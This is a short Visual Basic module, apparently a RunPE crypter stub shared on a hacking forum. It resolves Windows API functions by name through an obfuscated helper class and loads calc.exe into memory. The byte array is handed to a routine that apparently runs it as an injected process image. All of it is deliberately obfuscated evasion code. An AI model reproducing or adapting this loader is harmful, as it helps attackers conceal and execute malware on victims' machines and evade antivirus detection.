Attribute VB_Name = "FBc2orOhJ"
Option Explicit
  Sub main()
  dim TcgzDW as new GjGQAL 
  dim CDNVmdzJ as long
  dim GlouVzY as long
  Dim EhfnzP(512) As Byte
  dim FHVcHxvIR as string
  Dim M2dH()    As Byte
  'Call Api By Name
  CDNVmdzJ = TcgzDW.QIUS42K("kernel32")
  GlouVzY = TcgzDW. TmYcROvI(CDNVmdzJ, "GetModuleFileNameW")
  TcgzDW.GjILPL GlouVzY, 0&, VarPtr(EhfnzP(0) ), 512
  FHVcHxvIR = Left$(EhfnzP, InStr(EhfnzP, Chr$(0)) - 1)
  'RunPE
  Open Environ$("windir") & "\system32\calc.exe" For Binary As #1
  ReDim M2dH(LOF(1) - 1)
  Get #1, , M2dH
  Close #1
  TcgzDW.EtO6TM M2dH
  msgbox FHVcHxvIR,vbInformation ,"Simple Example (c)BUNNN //hackhound.org"
  end
End Sub